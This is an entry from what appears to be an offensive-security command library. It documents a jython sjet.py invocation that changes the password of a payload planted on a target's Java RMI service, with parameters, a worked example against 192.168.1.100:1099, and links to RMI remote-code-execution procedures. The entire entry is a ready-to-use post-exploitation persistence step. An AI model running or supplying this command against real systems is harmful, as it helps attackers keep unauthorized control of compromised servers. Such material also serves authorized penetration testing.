---
id: 8aa2f07d-4d88-48ba-9695-c30504924ab3
name: sjet-change-rmi-service-password
type: command
executor: bash
data: jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret password $_NEW_PASSWORD
output: null
created_at: '2023-04-06T03:56:00.890650+00:00'
updated_at: '2023-04-06T03:56:00.909054+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - persistence
verified: true
validated: true
---

# sjet-change-rmi-service-password

## Command

```bash
jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret password $_NEW_PASSWORD
```

## Description

Changes the password of the RMI service on the target using the sjet payload for persistence or access control.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | RMI port | Yes |
| super_secret | Payload name | Yes |
| password | Action to change password | Yes |
| $_NEW_PASSWORD | New password value | Yes |

## Examples

### Basic Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret password this-is-the-new-password
```

## Expected Output

"Password changed successfully."

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/sjet-install-payload-on-target]]
